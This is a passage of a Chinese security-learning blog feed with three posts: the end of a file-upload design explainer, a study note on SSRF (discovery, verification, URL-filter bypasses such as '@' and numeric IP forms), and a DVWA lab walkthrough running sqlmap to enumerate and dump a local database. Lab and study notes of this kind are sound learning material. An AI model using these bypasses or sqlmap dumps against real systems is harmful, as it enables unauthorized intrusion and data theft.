在发送前编码所有字符（默认）<br>       multipart/form-data  不对字符编码，在使用包含文件上传控件的表单时，必须使用该值；对于“multipart/form-data”类型的form表单，浏览器上传的实体内 容中的每个表单字段元素的数据之间用字段分隔界线进行分割，两个分隔界线间的内容称为一个分区，每个分区中的内容可以被看作两部分，一部分是对表单字段元 素进行描述的描述头，另外一部是表单字段元素的主体内容<br>       text/plain 空格转换为“+”，不对特殊字符编码</p><p>归纳的三个重要点：</p><p>1.提交方式必须为post；<br>2.表单中有文件上传的表单项必须为<input type="file">；<br>3.必须指定表单类型enctype=”multipart/form-data”。</p><p>例子（代码）：</p><pre><code>&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;      &lt;input type=&quot;file&quot; name=&quot;file&quot; value=&quot;请选择文件&quot;&gt;&lt;br /&gt;      &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;</code></pre><h5 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h5><p>​       WEB服务器端程序接收到“multipart/form-data”类型的HTTP请求消息后，其核心和基本的编程工作就是读取请求消息中的实体内容，然后解析出每个分区的数据，接着再从每个分区中解析出描述头和主体内容部分。<br>​       要在jsp里获得上传的文件，就是通过request.getInputStream()来得到上传的整个post实体的流，用 request.getHeader(“Content-Type”)来取得实体内容的分界字符串，然后根据http协议，分析取得的上传的实体流，把文 件部分给筛出来，然后在服务器端保存到磁盘文件中，另外因为上传文件时，form的属性enctype=”multipart/form-data”，所 以其他表单参数在上传文件时也无法得到，除了筛出文件进行保存，还应该把其他的参数一起取出保存，以便在jsp程序中调用。</p><p>具体方法如下：<br>1、 根据request获得文件输入流；<br>2、 依次读取行，此时进行两部分内容的处理，<br>  a:获取文件名<br>  以 filename=”xxxxx”来标识一个文件头，<br>  b:获取其他表单值（因为其流是按照multipart/form-data方式来编码的，所以在服务器端，不能     直接用request.getParameter()来获得）<br>    以name=”xxxx”来标识一个表单头，</p><p>​    都以流头的字符标识为值的结束；</p><p>实体内容内部的字段分隔界线是在content-type头中指定的字段分隔界线前面增加了两个减号（-）字符而形成的（由浏览器随机生成，由浏览器 保证不会与用户上传的文件内容重复）<br>当找到一个分区的开始位置后，程序还需要分辨出分区中的描述头和主体内容，并对这两部分内容分开存储。如何分辨出一个分区的描述头和主体部分呢？每 个分区中的描述头和主体内容之间有一空行，再加上描述头后面的换行，这就说明描述头和主体部分之间是使用“\n”、“\r”、“\n”、“\r”这四个连 续的字节内容进行分隔。因此，程序需要把“\n”、“\r”、“\n”、“\r”这四个连续的字节内容作为描述头和主体部分之间的分隔界线，并在字节数组 缓冲区buffer中寻找这个特殊的分隔界线来识别描述头和主体部分。</p><p>3、 根据读到的文件信息（文件名，文件大小等），判断是否合法（文件类型、文件大小判断）。如果合适则返回，如果不合适则创建同名文件并将其删除；</p><p>演示Form 显示提交的流的格式：  UI </p><p>当前的主流文件上传组件性能对比<br>    1、smartUpload          2、FileUpload           3、Cos<br>实例演示性能对比：<br>jspSmartUpload<br>fileUpLoad<br>cos<br>20M 、75M 、300M</p><p>所以选择Cos作为内部读取解析文件流的组件；<br><strong>使用组件而不是自己来解析文件流的原因：</strong><br>1、 读取文件大小的限制，如同smartUpload 组件一样，上传的文件大小会受到JVM内存容量的限制，因为读取的文件流都是存储在内存之中的，而fileUpLoad和cos采用的是当文件读取到了一定的大小就先写到硬盘上的临时目录中；</p><p>2、 读取效率的限制 ，组件可以根据文件的大小设定一定的缓存，来提升读取的效率，分配好内存的缓存大小，及硬盘目录缓存大小；<br>（文件缓存循环机制作的简要介绍，缓冲区如何正好读取到分区界限）</p><p><strong>此类组件的使用及封装方式：</strong><br>MultipartRequest mu = new MultipartRequest(HttpServletRequest request,Directory,MaxSize,”gbk”);</p><p>我们只需要传递一个申请的request流，目录名，它会自动完成相应的解析文件流的过程，然后直接在对应设置的目录中生成对应的同名文件；<br>代理模式：</p><pre><code>HttpServerRequestProxy：代理表单请求InputStreamRequestProxy：代理输入流</code></pre><p>整个的代理流程如下：<br>首先类HttpServerRequestProxy 继承于HttpServletRequestWrapper，并覆写它父类的getInputStream() 方法，在这个方法中我们设置它返回InputStreamRequestProxy流对象（当然这个类必须要与ServletInputstream 兼容，所以它必定继承于ServletInputstream），然后我们覆写这个流的read()方法，并在这个方法内部我们对文件上传的进度，速度进 行控制，而不是由组件提供的特定的进度监视器来获取准确的精度；</p><p>运行流程如下：<br>    组件以HttpServerRequestProxy对象为参数进行初始化，在其内部再调用参数的getInputStream()方法获取整个传入流，再使用流的read()方法读取实际内容，这样整个处理流的过程，都是从代理中通过的；</p><h5 id="服务器端获取文件传输速度的计算方式："><a href="#服务器端获取文件传输速度的计算方式：" class="headerlink" title="服务器端获取文件传输速度的计算方式："></a>服务器端获取文件传输速度的计算方式：</h5><ol><li>根据前后读取buffer的时间来测算，但是由于读取request 返回的流太过频繁，导致以毫秒计算，根本没有办法来计算实时速度；（不可行）</li><li>采用一个控制量，固定读取一定数量的buffer后，再根据服务器读取这段的长度所使用的时间来设定速度值；（需要设定BufferNUM的值，实时性较好，资源消耗最少）；</li><li>采用定时器，每过N秒访问一次文件读取的进度，设置相关的信息，但返回的上传速度可能为 0，或者是无穷；</li></ol><h5 id="判断上传文件（单个）大小是否符合服务器设置："><a href="#判断上传文件（单个）大小是否符合服务器设置：" class="headerlink" title="判断上传文件（单个）大小是否符合服务器设置："></a>判断上传文件（单个）大小是否符合服务器设置：</h5><p>（如何快速判断，而不是等二进制流读取完再返回错误信息。）<br>javaScript 客户端脚本判断，但是针对不同的浏览器，不同的权限设置，不一定能成功；（且于服务器端实际读取的文件大小精度有差异，难以靠以上传的流的大小来保证文件是否已经上传完毕）<br>function ShowFileSize()<br>{<br>            var fso = new ActiveXObject(“Scripting.FileSystemObject”);<br>        var f, s, file;<br>        if (“object” != typeof(fso))<br>            return;<br>        file = FormName.fileName.value;<br>        f = fso.GetFile(file);<br>        alert(f.size);<br>}</p><p>服务器即时判断：服务器读取流，直到读取的流的数量大于所设定大的限制，则返回错误信息。（占太多的时间，且浪费服务器资源）<br>服务器端判断：在发送POST请求时，信息头里面都包含 Content-Length 属性，其代表着整个请求的数据长度。我们可以通过简单的判断这个Header数据，发现超过了我们允许的长度则直接断开连接，这样就不会对服务器造成资源浪费。<br>演示：simpleFileUpload   index.jsp</p><h5 id="如何判断批量上传的每一个文件的大小："><a href="#如何判断批量上传的每一个文件的大小：" class="headerlink" title="如何判断批量上传的每一个文件的大小："></a>如何判断批量上传的每一个文件的大小：</h5><p>（使用方法二）<br>1． 在客户端判断文件大小，只提交服务器一个文件流，但是文件大小的精确程度会有一定程度的不同，导致一种假死现象；还会有客户端js代码的权限问题。</p><p>2． 在服务器端判断文件大小，但是服务器在真实读取文件流之前 ，使用上面的方法二，只能得到整个流的大小，不能得到，单个文件的大小；这样只能实现整个上传进度的统计。而不可能实现多个文件分开计算其精度的方法；<br>演示：simpleFileUpload   pLOneStream.jsp</p><p>3．每个文件提交一个文件流，服务器对每个流处理时返回文件大小及文件进度。方法是，每个 <input type="”file”"> 标签都置于一个独立的form表单中，然后一次提交；</p><h5 id="服务器如何在真正文件上传-读取流-之前获得文件名？"><a href="#服务器如何在真正文件上传-读取流-之前获得文件名？" class="headerlink" title="服务器如何在真正文件上传(读取流)之前获得文件名？"></a>服务器如何在真正文件上传(读取流)之前获得文件名？</h5><p>​    按照正常的Http上传文件的方式是不能实现的，只有在客户端向服务器提交表单之前先向服务器提交一个Ajax请求，然后服务器调用Ajax请求传递过来 的参数（文件名）来判断是否符合服务器提交要求，如果符合则在客户端的回调函数中提交本文件所属的form表单；如果不符合则返回出错信息；</p><p>如果文件不合法，服务器、客户端如何而实现：<br>（此时服务器已经必定在读http传递过来的文件流，除非判断文件名是在客户端判断，或者是使用Ajax在服务器端判断的方法）<br>1、 客户端使用Ajax 接受服务器返回出错信息，并在服务器内部读取流文件时，如果发现文件不合法则抛出特定的异常，并在服务器内部自行捕获处理；<br>2、 流覆盖；<br>流覆盖演示：streamCover<br>原理：将两个请求同时提交到一个地方，导致后面的流截断前面正在上传的文件流，从而达到删除正在上传的文件的效果；（删除正在上传的文件）</p><h5 id="客户端从服务器读取文件上传进度信息："><a href="#客户端从服务器读取文件上传进度信息：" class="headerlink" title="客户端从服务器读取文件上传进度信息："></a>客户端从服务器读取文件上传进度信息：</h5><h5 id="Ajax"><a href="#Ajax" class="headerlink" title="(Ajax)"></a>(Ajax)</h5><p><strong>几个重要的步骤：</strong><br>1、  构建Ajax 对象；（需要针对不同的浏览器进行构建），参见代码；cosex—UpLoadFile.html—getAjax；<br>2、  设置回调函数 onreadystatechange;<br>3、  设置携带特定参数信息的URL；<br>4、  发送请求；<br>5、  等待回调；</p><p><strong>需要注意的问题：</strong><br>1、  IE缓存问题；<br>解决方法：<br>清除由于IE缓存造成的Ajax不能多次发出请求：<br>服务器端：<br>response.setHeader(“Cache-Control”,”no-cache”);<br>客户端<br> 在Ajax发出的请求URL后添加一个随机数（Math.random()），这样对于IE来说每次请求的页面都不是同一个页面就不会造成直接调用缓存页面的问题；</p><p>2、  同步还是异步请求的问题；<br>Ajax的优势就是可以异步发送请求到服务器，而不需要服务器实时的去相应，所以设为异步；</p><p><strong>服务器端相应Ajax请求的几个问题：</strong><br>1、  Ajax异步请求与传统请求在服务器端的判断方法；<br>request.getHeader(“x-requested-with”);<br>b．在URL后添加一个与服务器端约定好的参数；<br>（在服务器端都必须显示的去判断）<br>2、  字符编码问题；<br>Ajax请求默认的参数默认均为 ”ISO8859-1”，在服务器端必须要进行解码；</p><p><strong>与进度条的集成：</strong><br>根据Ajax从服务器获取的文件信息（文件大小，上传速度，上传百分比等信息），信息每更新一次就设定进度条的值；动态隐藏和显示显示进度条的div；</p><p><strong>UI上传组件应该具备以下基本功能：</strong></p><ol><li>能让用户提供一个上传路径</li><li>能够限制上载文件的大小（防止上传文件过大）<ol start="3"><li>能够支持多个文件同时上传及限制并行上传文件的个数（多文件并行上传）</li><li>可以在服务器端进行异常错误捕获，并进行适当的处理</li><li>上传组件的稳定性（上传速度能够保持稳定）</li></ol></li><li>可以设定屏蔽（或指定）固定类型的文件（如以 .exe结尾的文件等）</li><li>能够向用户提供一个友好的交互界面，实时显示该文件上传的进度、当前用户的网络状态、上传此文件已花费时间、传输速率，剩余时间等信息</li><li>支持对已上传或正在上传文件的删除</li><li>用户使用及操作及可扩展 ，并能够灵活的集成到其它项目中</li></ol><pre><code>     Ajax的同步问题 ；（两个不同的页面同时访问一个服务端URL，导致两者得到的值竟然是后者的值）</code></pre><p>一个页面的，多表单提交的问题解决方案：<br>1．  使用Ajax 实现。<br>2．  使用 form 的target 属性提交到一个本页面的iframe 的name 上，那样页面就不会跳转。</p><p>Javascript问题：<br>引号中传字符串值； 可以单双引号嵌套使用<br>Setinterval（）函数传值，采用<br>function(){ realFunction(args)} 的匿名传值方法；<br>3．  取消计时器clearInterval(timerID);</p><p>一个页面多次提交导致流被截断；<br>       如果是提交到一个隐藏的frame中的话，那么会导致流被截断，必须提交到不同的隐藏frame中，才可以异步提交到服务器。</p><p><a href="http://blog.sina.com.cn/s/blog_8f32dc250100wva8.html" target="_blank" rel="noopener">转载来源博客</a></p><p><a href="https://blog.csdn.net/qq_27053493/java/article/details/100589143" target="_blank" rel="noopener">参考博客</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传原理&quot;&gt;&lt;a href=&quot;#文件上传原理&quot; class=&quot;headerlink&quot; title=&quot;文件上传原理&quot;&gt;&lt;/a&gt;文件上传原理&lt;/h1&gt;&lt;p&gt;文件上传：因为浏览器本身的限制，浏览器是不能直接操作文件系统的，需要通过浏览器所暴露出来的统一接口，由用户主
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>什么是SSRF？</title>
    <link href="http://yoursite.com/2020/05/14/%E4%BB%80%E4%B9%88%E6%98%AFSSRF%EF%BC%9F/"/>
    <id>http://yoursite.com/2020/05/14/%E4%BB%80%E4%B9%88%E6%98%AFSSRF%EF%BC%9F/</id>
    <published>2020-05-14T12:38:40.833Z</published>
    <updated>2020-05-10T06:06:40.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF漏洞学习"><a href="#SSRF漏洞学习" class="headerlink" title="SSRF漏洞学习"></a>SSRF漏洞学习</h1><h2 id="什么是SSRF？"><a href="#什么是SSRF？" class="headerlink" title="什么是SSRF？"></a>什么是SSRF？</h2><p>SSRF漏洞寻找内网入口，是突破内网的一个方法。<br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h5 id="（服务端跟客户端的区别："><a href="#（服务端跟客户端的区别：" class="headerlink" title="（服务端跟客户端的区别："></a>（服务端跟客户端的区别：</h5><p>服务端是一种有针对性的服务程序。它的主要表现形式以“windows窗口程序”与“控制台”为主。一般大型的服务端都是在Linux环境下搭建。运行服务端的电脑称之为“服务器”。</p><p>客户端与服务端：服务端，是为客户端服务的。服务的内容诸如向客户端提供资源，保存客户端数据；客户端就是我们使用的电脑（包括我们使用的浏览器IE,Firefox）；服务器端就是存放网页与数据库数据的服务器。</p><p>通俗一点讲：服务端应该是服务器端，就是都访问它，它共享数据大家来用，它就是服务器端，每个访问服务器端的都是客户端！</p><p>或者也可以这样说：服务器端是远程服务器，运行结果是由服务器产生的；客户端就是网友的电脑。所有的动态网页都是在服务器端执行的，例如ASP、PHP、JSP；所有的静态网页都是在客户端执行的，例如JavaScript、Flash都是属于静态网页。 </p><p>举例：例如你使用JavaScript写了e799bee5baa6e58685e5aeb931333264656666一个显示日期的程序，它显示的只是客户端的系统日期，如果你修改了你的电脑的系统日期，那么这个JavaScript程序的运行结果也会变。<br>而如果使用ASP编写了显示日期的程序，如 &lt;%=date%&gt; ，显示的则是服务器的日期。如果你修改了你的电脑的系统日期，这个显示结果是不会变的 。</p><h5 id="参考网址1-参考网址2-）"><a href="#参考网址1-参考网址2-）" class="headerlink" title="参考网址1  参考网址2  ）"></a><a href="https://zhidao.baidu.com/question/337589385.html?sort=11&rn=5&pn=5" target="_blank" rel="noopener">参考网址1</a>  <a href="https://baike.baidu.com/item/服务端/6492316?fr=aladdin" target="_blank" rel="noopener">参考网址2</a>  ）</h5><h2 id="SSRF漏洞的寻找"><a href="#SSRF漏洞的寻找" class="headerlink" title="SSRF漏洞的寻找"></a>SSRF漏洞的寻找</h2><h4 id="一、从WEB功能上寻找"><a href="#一、从WEB功能上寻找" class="headerlink" title="一、从WEB功能上寻找"></a>一、从WEB功能上寻找</h4><p>我们从上面的概述可以看出，SSRF是由于服务端获取其他服务器的相关信息的功能中形成的，因此我们大可以列举几种在web 应用中常见的从服务端获取其他服务器信息的的功能。<br>1）分享：通过URL地址分享网页内容<br>早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的<tilte>标签或者<meta name="description" content>标签中content的文本内容作为显示以提供更好的用户体验。</tilte></p><p><img src="https://img-blog.csdnimg.cn/20190704195033842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTMzNzE3,size_16,color_FFFFFF,t_70" alt></p><p>2）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3）在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等</p><p>4）图片加载与下载：通过URL地址加载或下载图片<br>图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了？ ，没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题）。</p><p>5）图片、文章收藏功能<br>此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。<br>6）未公开的api实现以及其他调用URL的功能<br>此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p><p>（备注：API，即应用程序编程接口。<br>说得更加通俗易懂一些，别人写好的代码，或者编译好的程序，提供给你使用，就叫做API。你使用了别人代码（或者程序）中的某个函数、类、对象，就叫做使用了某个API。<a href="baijiahao.baidu.com/s?id=1586026960877760125&wfr=spider&for=pc">参考博客</a>）</p><h4 id="二、从URL关键字中寻找"><a href="#二、从URL关键字中寻找" class="headerlink" title="二、从URL关键字中寻找"></a>二、从URL关键字中寻找</h4><p>在对功能上存在SSRF漏洞中URL地址特征的观察，通过我一段时间的收集，大致有以下关键字:</p><p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>3g<br>display<br>sourceURl<br>imageURL<br>domain<br>…</p><p>如果利用google 语法加上这些关键字去寻找SSRF漏洞，耐心的验证，现在还是可以找到存在的SSRF漏洞。</p><h2 id="SSRF-漏洞的验证"><a href="#SSRF-漏洞的验证" class="headerlink" title="SSRF 漏洞的验证"></a>SSRF 漏洞的验证</h2><h4 id="1）基本判断（排除法）"><a href="#1）基本判断（排除法）" class="headerlink" title="1）基本判断（排除法）"></a>1）基本判断（排除法）</h4><p>例如： 这样的代码</p><pre><code>http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</code></pre><p>排除法一：<br>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<code>http://www.baidu.com/img/bd_logo1.png</code>，说明不存在SSRF漏洞。<br>排除法二：<br>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p><p><a href="http://p9.qhimg.com/t01554ac9cba1ae96e9.png" target="_blank" rel="noopener"><img src="http://p9.qhimg.com/t01554ac9cba1ae96e9.png" alt="img"></a></p><p><strong>问题1：如何设置burpsuite截断图片请求？是Intercept Client Requests：设置过滤客户端请求；Intercept Server Response：设置过滤服务端响应；这两个按钮？</strong></p><p><strong>答：</strong></p><p>为什么这边用排除法来判断是否存在SSRF，举例如下：</p><p><a href="http://p2.qhimg.com/t01080058bb303b1e6f.png" target="_blank" rel="noopener"><img src="http://p2.qhimg.com/t01080058bb303b1e6f.png" alt="img"></a></p><pre><code>http://read.*******.com/image?imageUrl=http://www.baidu.com/img/bd_logo1.png</code></pre><p>现在大多数修复SSRF的方法基本都是区分内外网来做限制（暂不考虑利用此问题来发起请求，攻击其他网站，从而隐藏攻击者IP，防止此问题就要做请求的地址的白名单了），如果我们请求 ：</p><pre><code>http:``//read.******.com/image?imageUrl=http://10.10.10.1/favicon.ico</code></pre><p>而没有内容显示，我们是判断这个点不存在SSRF漏洞，还是<code>http://10.10.10.1/favicon.ico</code>这个地址被过滤了，还是<code>http://10.10.10.1/favicon.ico</code>这个地址的图片文件不存在，如果我们事先不知道<code>http://10.10.10.1/favicon.ico</code>这个地址的文件是否存在的时候是判断不出来是哪个原因的，所以我们采用排除法。</p><h4 id="2）实例验证"><a href="#2）实例验证" class="headerlink" title="2）实例验证"></a>2）实例验证</h4><p>经过简单的排除验证之后，我们就要验证看看此URL是否可以来请求对应的内网地址。在此例子中，首先我们要获取内网存在HTTP服务且存在favicon.ico文件的地址，才能验证是否是SSRF漏洞。<br>找存在HTTP服务的内网地址：<br>一、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址<br>二、通过二级域名暴力猜解工具模糊猜测内网地址</p><p><a href="http://p0.qhimg.com/t01111bbf7ba9e818bc.png" target="_blank" rel="noopener"><img src="http://p0.qhimg.com/t01111bbf7ba9e818bc.png" alt="img"></a></p><pre><code>example:ping xx.xx.com.cn</code></pre><p>可以推测10.215.x.x 此段就有很大的可能： <code>http://10.215.x.x/favicon.ico</code> 存在。</p><p>在举一个特殊的例子来说明：</p><pre><code>http://fanyi.baidu.com/transpage?query=http://www.baidu.com/s?wd=ip&amp;source=url&amp;ie=utf8&amp;from=auto&amp;to=zh&amp;render=1</code></pre><p><a href="http://p7.qhimg.com/t01365be44f183f878d.png" target="_blank" rel="noopener"><img src="http://p7.qhimg.com/t01365be44f183f878d.png" alt="img"></a></p><p>此处得到的IP 不是我所在地址使用的IP，因此可以判断此处是由服务器发起的<code>http://www.baidu.com/s?wd=ip</code> 请求得到的地址，自然是内部逻辑中发起请求的服务器的外网地址（为什么这么说呢，因为发起的请求的不一定是fanyi.baidu.com，而是内部其他服务器）,那么此处是不是SSRF，能形成危害吗？  严格来说此处是SSRF，但是百度已经做过了过滤处理，因此形成不了探测内网的危害。</p><h2 id="SSRF-漏洞中URL地址过滤的绕过"><a href="#SSRF-漏洞中URL地址过滤的绕过" class="headerlink" title="SSRF 漏洞中URL地址过滤的绕过"></a>SSRF 漏洞中URL地址过滤的绕过</h2><p>1）<code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code> 请求是相同的</p><p><a href="http://p9.qhimg.com/t0156e722ce8229ee37.png" target="_blank" rel="noopener"><img src="http://p9.qhimg.com/t0156e722ce8229ee37.png" alt="img"></a></p><p>此脚本访问请求得到的内容都是<code>www.baidu.com</code>的内容。 </p><p>2）ip地址转换成进制来访问</p><p><a href="http://p0.qhimg.com/t01463b751ace2a25f1.png" target="_blank" rel="noopener"><img src="http://p0.qhimg.com/t01463b751ace2a25f1.png" alt="img"></a></p><p>此脚本解析的地址都是 115.239.210.26，也可以使用ping 获取解析地址：</p><p><a href="http://p8.qhimg.com/t01463bbf60442953e7.png" target="_blank" rel="noopener"><img src="http://p8.qhimg.com/t01463bbf60442953e7.png" alt="img"></a></p><p>如果WEB服务简单的过滤参数中获取的URL地址，没有判断真正访问的地址，是有可能被此两种方法绕过的。</p><p><a href="http://bobao.360.cn/learning/detail/240.html" target="_blank" rel="noopener">参考的博客：http://bobao.360.cn/learning/detail/240.html</a></p><p><a href="http://drops.wooyun.org/tips/750" target="_blank" rel="noopener">过滤参考</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SSRF漏洞学习&quot;&gt;&lt;a href=&quot;#SSRF漏洞学习&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞学习&quot;&gt;&lt;/a&gt;SSRF漏洞学习&lt;/h1&gt;&lt;h2 id=&quot;什么是SSRF？&quot;&gt;&lt;a href=&quot;#什么是SSRF？&quot; class=&quot;head
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Dvwa SQL注入（sqlmap的使用）</title>
    <link href="http://yoursite.com/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/</id>
    <published>2020-05-14T12:37:13.436Z</published>
    <updated>2020-05-14T07:29:35.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Dvwa-SQL注入（sqlmap的使用）"><a href="#Dvwa-SQL注入（sqlmap的使用）" class="headerlink" title="Dvwa SQL注入（sqlmap的使用）"></a>Dvwa SQL注入（sqlmap的使用）</h1><p>Sqlmap中文手册（讲得非常详细）参考链接：<a href="https://blog.csdn.net/wn314/article/details/78872828" target="_blank" rel="noopener">https://blog.csdn.net/wn314/article/details/78872828</a></p><p>1.输入sqlmap.py –u url –dbs （URL是输入id后的页面的url，也就是提交过数据的页面的url）不行所以得加上cookie（按f12后打开火狐浏览器的开发者工具-网络栏-点击网络栏下面一行右边会弹出框框-点击Cookie栏即可找到cookie）</p><p>所以输入：</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; –dbs</code></p><p>得到目标所有数据库名</p><img src="/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20200514152522663.png" alt="image-20200514152522663" style="zoom: 150%;"><p>（备注：（1）关于cookie，有两种情况sqlmap会用到：</p><p>1.要测试的页面只有在登录状态下才能访问，登录状态用cookie识别</p><p>2.想要检测是否存在cookie注入</p><p>（2）-u参数表示url，指定连接目标</p><p>–dbs表示列出目标有哪些数据库）</p><p>2.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –tables</code></p><p>得到数据库内所有表</p><img src="/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20200514152600062.png" alt="image-20200514152600062" style="zoom:150%;"><p>（备注：（1）-D：指定数据库</p><p>-tables：列举数据库中所有表）</p><p>3.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –T users --columns</code></p><p>得到表中所有字段名及类型</p><p><img src="/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200514152654013.png" alt="image-20200514152654013"></p><p>（备注：（1）-T，指定表</p><p>–columns，指定表中所有列的名字和数据类型）</p><p>4.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –T users --count</code></p><p>得到表中的数据总数</p><p>![说明: C:\Users\DELL\AppData\Roaming\Tencent\Users\481820058\QQ\WinTemp\RichOle$)H2{E11@~2QE)`5CXPJ%WS.png](file:///C:\Users\DELL\AppData\Local\Temp\msohtmlclip1\01\clip_image002.jpg)</p><p>5.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –T users –dump</code></p><p>得到所有数据</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CLocal%5CTemp%5Cmsohtmlclip1%5C01%5Cclip_image004.jpg" alt="说明: C:\Users\DELL\AppData\Roaming\Tencent\Users\481820058\QQ\WinTemp\RichOle\P)FU4(F5RSOJT4VAQV}U1IC.png"></p><p>备注：（1）–dump，列举数据。它也会保存数据到CSV格式文件中，文件具体路径会在输出中给出。</p><p>参考题解：<a href="https://blog.csdn.net/weixin_42555985/article/details/87546621" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42555985/article/details/87546621</a></p><p>Medium级别：</p><p>1.需要自己加入id=…（因为提交后的url里面没有  ?id=…  ，所以得自己补充）</p><p>如：第一步输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;submit=submit&quot; --cookie &quot;security=medium;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; –dbs</code></p><p>2.接下去的步骤同上</p><p>High级别：同medium级别</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Dvwa-SQL注入（sqlmap的使用）&quot;&gt;&lt;a href=&quot;#Dvwa-SQL注入（sqlmap的使用）&quot; class=&quot;headerlink&quot; title=&quot;Dvwa SQL注入（sqlmap的使用）&quot;&gt;&lt;/a&gt;Dvwa SQL注入（sqlmap的使用）&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
